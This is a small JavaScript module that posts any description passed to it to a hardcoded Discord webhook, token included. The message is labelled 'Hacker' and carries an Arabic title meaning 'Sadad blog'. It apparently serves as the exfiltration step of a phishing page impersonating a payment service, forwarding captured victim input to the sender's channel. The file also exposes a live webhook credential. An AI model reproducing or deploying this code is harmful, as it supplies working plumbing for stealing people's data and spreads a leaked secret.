import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: " مدونة سداد ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1327045061028085852/TLx5OkdLXLssSc2cY29UEn13MjpXYItFWqWfzjwPdGjwYAPBGh4PZOmSgeutVJlHLuX7",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
